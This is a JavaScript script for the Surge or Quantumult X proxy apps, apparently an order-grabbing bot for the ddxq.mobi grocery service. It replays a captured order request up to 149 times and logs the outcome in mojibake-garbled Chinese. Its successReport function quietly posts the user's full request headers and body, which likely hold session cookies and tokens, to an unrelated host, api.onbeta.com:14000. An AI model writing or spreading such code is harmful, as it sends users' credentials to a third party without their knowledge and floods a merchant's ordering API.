const matrix = init()

;(exec = async () => {
    matrix.log(`đ ćčˇĺ°ä¸ĺčŻˇćąďźĺźĺ§ĺ˘é`)
    for (let i = 1; i < 150; i++) await clone(i)
  })()
  .catch((e) => matrix.log(`â ĺ¤ĺśĺ¤ąč´Ľ: ${e}`))
  .finally(() => matrix.done())

  function clone(cnt) {
    return new Promise((resolve, reject) => {

        const url = { url: $request.url, headers: $request.headers }
    //   url.headers['Accept'] = '*/*'
    //   url.headers['Origin'] = 'https://activity.m.ddxq.mobi'
    //   url.headers['Accept-Encoding'] = 'gzip, deflate, br'
    //   url.headers['Content-Type'] = 'application/x-www-form-urlencoded'
    //   url.headers['Host'] = 'ddxq.mobi'
    //   url.headers['Connection'] = 'keep-alive'
    //   url.headers['Referer'] = 'https://activity.m.ddxq.mobi/'
    //   url.headers['Content-Length'] = '129'
    //   url.headers['Accept-Language'] = 'zh-cn'

         url.headers = $request.headers
         url.body = $request.body
   
         
      matrix.post(url, (error, response, data) => {
        try {
          if(JSON.parse(data).code == -3000){
            matrix.log(`â ćąć­äşşĺ¤ćĽć¤ --ă${cnt}ă(${JSON.parse(data).code}): ${JSON.parse(data).msg}`)
            resolve()
          }
          else if(JSON.parse(data).code == -3001){
            matrix.log(`â ĺćšćĽć¤ďźç¨ĺĺčŻ --ă${cnt}ă(${JSON.parse(data).code})`)
            resolve()
          }
          else if(JSON.parse(data).success == true){
            matrix.msg(`â­ čŽ˘ĺćäş¤ćĺ`, `ă${cnt}ăĺˇ˛ćĺä¸ĺďźčŻˇçŤĺłćŻäť`, `msg: ${JSON.parse(data).msg}`)
            matrix.log(`â­ čŽ˘ĺćäş¤ćĺ --ă${cnt}ă`)
            successReport()
            resolve()
          }
          else if(JSON.parse(data).code == 5003){
            matrix.msg(`â ĺĺĺ¨é¨ĺŽç˝`, `ă${cnt}ăčżĺçťćďźĺĺĺ¨é¨ĺŽç˝`, `msg: ${JSON.parse(data).msg}`)
            matrix.log(`â ĺĺĺ¨é¨ĺŽç˝ --ă${cnt}ă: ${JSON.parse(data).msg}`)
            resolve()
          }
          else if(JSON.parse(data).code == 5014){
            matrix.log(`â ććŞčĽä¸ --ă${cnt}ă: ${JSON.parse(data).msg}`)
            resolve()
          }
          else{
            matrix.log(`â ä¸ĺĺ¤ąč´Ľ--ă${cnt}ă(${JSON.parse(data).code}): ${JSON.parse(data).msg}`)
            resolve()
          }
          
        } catch (e) {
            matrix.log(`â éčŻŻ --ă${cnt}ă: ${e}`)
            matrix.log(`â éčŻŻ --ă${cnt}ă - response: ${JSON.stringify(response)}`)
          resolve()
        }
      })
    })
  }

  function successReport() {
    return new Promise((resolve, reject) => {

        const url = { url: 'https://api.onbeta.com:14000/orderreport', headers: $request.headers }
    //   url.headers['Accept'] = '*/*'
    //   url.headers['Origin'] = 'https://activity.m.ddxq.mobi'
    //   url.headers['Accept-Encoding'] = 'gzip, deflate, br'
    //   url.headers['Content-Type'] = 'application/x-www-form-urlencoded'
    //   url.headers['Host'] = 'ddxq.mobi'
    //   url.headers['Connection'] = 'keep-alive'
    //   url.headers['Referer'] = 'https://activity.m.ddxq.mobi/'
    //   url.headers['Content-Length'] = '129'
    //   url.headers['Accept-Language'] = 'zh-cn'

         url.headers = $request.headers
         url.body = $request.body
   
         
      matrix.post(url, (error, response, data) => {
        try {
          if(JSON.parse(data).code == 0){
            matrix.log(`â ĺˇ˛ćĺä¸ćĽ`)
            resolve()
          }
          else{
            matrix.log(`â ä¸ćĽĺ¤ąč´Ľ`)
            resolve()
          }
          
        } catch (e) {
            matrix.log(`â éčŻŻ : ${e}`)
          resolve()
        }
      })
    })
  }



  function init() {
    isSurge = () => {
      return undefined === this.$httpClient ? false : true
    }
    isQuanX = () => {
      return undefined === this.$task ? false : true
    }
    msg = (title, subtitle, body) => {
      if (isSurge()) $notification.post(title, subtitle, body)
      if (isQuanX()) $notify(title, subtitle, body)
    }
    log = (message) => console.log(message)
    get = (url, cb) => {
      if (isSurge()) {
        $httpClient.get(url, cb)
      }
      if (isQuanX()) {
        url.method = 'GET'
        $task.fetch(url).then((resp) => cb(null, resp, resp.body))
      }
    }
    post = (url, cb) => {
      if (isSurge()) {
        $httpClient.post(url, cb)
      }
      if (isQuanX()) {
        url.method = 'POST'
        $task.fetch(url).then((resp) => cb(null, resp, resp.body))
      }
    }
    done = (value = {}) => {
      $done(value)
    }
    return { isSurge, isQuanX, msg, log, get, post, done }
  }
  
